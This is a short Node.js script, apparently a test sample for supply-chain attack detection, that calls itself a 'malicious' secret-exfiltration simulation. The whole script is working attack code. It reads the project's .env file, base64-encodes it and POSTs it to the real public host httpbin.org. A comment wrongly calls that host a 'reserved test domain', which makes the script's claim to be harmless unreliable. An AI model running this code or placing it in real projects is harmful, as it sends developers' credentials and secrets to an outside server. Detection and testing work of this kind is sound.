const fs = require("fs");
const https = require("https");
const path = require("path");

console.log("[malicious] starting secret exfil simulation");

// 1️⃣ Read .env
const envPath = path.join(process.cwd(), ".env");

let envData;
try {
  envData = fs.readFileSync(envPath, "utf8");
  console.log("[malicious] .env file read successfully");
} catch {
  console.log("[malicious] no .env file found, exiting");
  process.exit(0);
}

// 2️⃣ Base64 encode
const payload = Buffer.from(envData, "utf8").toString("base64");

// 3️⃣ Send to another domain (TEST / NON-REAL)
const options = {
  hostname: "www.httpbin.org", // ⚠️ reserved test domain
  port: 443,
  path: "/post",
  method: "POST",
  headers: {
    "Content-Type": "application/octet-stream",
    "Content-Length": Buffer.byteLength(payload),
  },
};

console.log("[malicious] attempting outbound request in 2 seconds...");

setTimeout(() => {
  const req = https.request(options, (res) => {
    console.log(`[malicious] outbound request status: ${res.statusCode}`);
  });

  req.on("error", (e) => {
    console.error("[malicious] request failed:", e.message);
  });

  req.write(payload);
  req.end();
}, 2000);
